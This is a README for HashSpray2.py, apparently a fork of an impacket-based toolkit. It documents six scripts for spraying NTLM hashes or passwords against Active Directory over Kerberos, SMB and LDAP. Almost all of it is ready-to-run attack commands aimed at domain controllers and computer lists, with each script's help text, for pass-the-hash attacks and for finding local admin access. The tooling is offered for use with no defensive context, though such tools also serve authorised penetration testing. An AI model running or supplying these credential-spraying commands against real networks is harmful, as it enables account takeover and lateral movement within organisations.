# HashSpray2.py

Note: This project fork @cube0x0 's [HashSpray.py](https://github.com/cube0x0/HashSpray.py).

[@manesec](https://github.com/manesec) adding more features base on HashSpray.py which in
+ `HashSpray.py`


This was built using the impacket library

```
python hashspray.py -user '<user>' -hashes <hashes.txt> -domain <domain> -dc-ip <apt>

Kerberos AS-REQ Spraying Toolkit for a known user and PassTheHash Attack. (Base on domainspray.py and mod by @manesec).

optional arguments:
  -h, --help           show this help message and exit

authentication:
  -user user           A known users to spray, format is [[domain/]username
  -hashes hashes_file  NTLM hashes, format is LMHASH:NTHASH in the files

connection:
  -domain domain       FQDN of the target domain
  -dc-ip ip address    IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -t int               Number of thread, default is 5
  -v 0,1               Show trying message, 1 will be enable, default is 0

```

```
python domainspray.py -userlist users -hashes :1uca3d1bd1a33geb1b15bab12196r5aa -target-ip 192.168.5.1


Active Directory Spraying Toolkit

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -userlist userlist    List of users to spray, format is [[domain/]username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        will use the domain part (FQDN) specified in the
                        target parameter
  -target-ip ip address
                        IP Address of the target machine. This may be any be
                        any domain joined computer or a domain controller
  -port [destination port]
                        Destination port to connect to SMB Server
```


```
python localspray.py -computerlist ./computers.txt -username administrator -hashes :1uca3d1bd1a33geb1b15bab12196r5aa 


Local User Spraying Toolkit

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -computerlist computerlist
                        List of computers to spray
  -username username    Username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -port [destination port]
                        Destination port to connect to SMB Server
```


```
python adminspray.py -computerlist ./computers.txt -username cube0x0 -hashes :1uca3d1bd1a33geb1b15bab12196r5aa 


Discover Local Admin Access Spraying Toolkit

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -computerlist computerlist
                        List of computers to spray
  -username username    Username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -port [destination port]
                        Destination port to connect to SMB Server
```


```
python3 kerbspray.py  -userlist users -hashes :1uca3d1bd1a33geb1b15bab12196r5aa -dc-ip 192.168.221.10 -domain htb.local

Kerberos AS-REQ Spraying Toolkit

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -userlist userlist    List of users to spray, format is [[domain/]username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -domain domain        FQDN of the target domain
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        will use the domain part (FQDN) specified in the
                        target parameter
```

```
python ldapspray.py -userlist users  -hashes :1uca3d1bd1a33geb1b15bab12196r5aa -dc-ip 192.168.221.11

LDAP[s] Spraying Toolkit

optional arguments:
  -h, --help            show this help message and exit
  -port {389,636}       Destination port to connect to. LDAP defaults to 389,
                        LDAPS to 636.

authentication:
  -userlist userlist    List of users to spray, format is [[domain/]username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -domain domain        FQDN of the target domain
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        will use the domain part (FQDN) specified in the
                        target parameter
```
